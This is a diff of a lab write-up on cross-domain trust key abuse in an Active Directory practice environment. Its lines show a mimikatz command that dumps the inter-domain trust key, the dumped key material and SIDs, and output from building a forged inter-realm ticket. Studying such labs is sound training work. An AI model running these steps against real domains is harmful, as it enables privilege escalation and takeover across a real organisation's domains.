@@ -1,4 +1,4 @@
-# Learning Objective 18 (Domain Privilege Escalation | Across Domain Trusts - Trust Key Abuse)
+# Learning Objective 18 (Cross Trust Attacks | Domains Trust Key Abuse)
 
 ## Tasks
 
@@ -128,7 +128,7 @@ mimikatz(commandline) # lsadump::evasive-trust /patch
 
 Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648📌)
 
-Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914📌)
  [  In ]📌 DOLLARCORP.MONEYCORP.LOCAL🏛️ -> MONEYCORP.LOCAL🏛️
     * 2/5/2025 9:09:45 PM - CLEAR   - a4 f5 58 eb 73 17 cd b9 f7 17 c5 f1 79 cd 72 b9 23 ff 84 dc 0c 60 a0 53 51 fd 5b 72 86 97 f6 3e d8 39 9a b4 4f 9c 95 e8 e3 98 54 f7 54 97 28 31 8d 41 0a da 77 d8 fd 46 9e c1 77 22 7c 1f 67 99 43 9c 68 a7 00 1c cd d5 cf 60 33 7b 6b e7 23 dd 1e 64 d3 7b 88 c8 cf ea 05 0b a3 08 1c cc 13 aa ea 78 75 33 c5 20 f0 24 8a de 61 2b a7 91 39 9b 66 8a cd 04 6e 23 92 39 c1 22 7b 62 65 24 48 16 2c f2 02 15 6e 76 cc 3c 81 1b 86 2e 02 f7 1d 65 68 bf bd 6b 8c c5 d8 77 1e e2 19 be f7 34 c3 99 27 b1 7c bc 56 a2 75 a7 a7 57 c4 be 27 4b c2 7c f9 49 28 42 99 85 8b 1a 56 5c 27 85 9a 0d 17 d6 ea d4 07 ee 06 59 eb 25 65 59 c7 12 e9 11 be a1 ce 8f 95 4c 03 74 10 0d 92 ab 68 63 dd 15 87 07 6b 8c 92 51 f4 d1 2f f7 d2 e3 20 aa bd 43 68 a0
         * aes256_hmac       66a7798a2a045f5e7d429fee84d129659c0fa52a21e2782b14b4bc30909f0181
@@ -148,25 +148,7 @@ Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 
 [*] Action: Build TGS📌
 
-[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
-[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
-[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
-[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully mounted
-[*] Attempting to unmount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
-[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
-[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
-[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully mounted
-[*] Attempting to unmount: \\us.dollarcorp.moneycorp.local\SYSVOL
-[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
-[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
-[*] Retrieving group information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513))'
-[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
-[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
-[*] Building PAC
+[SNIP]
 
 [*] Domain         : DOLLARCORP.MONEYCORP.LOCAL🏛️ (dcorp)
 [*] SID            : S-1-5-21-719815819-3726368948-3917688648📌
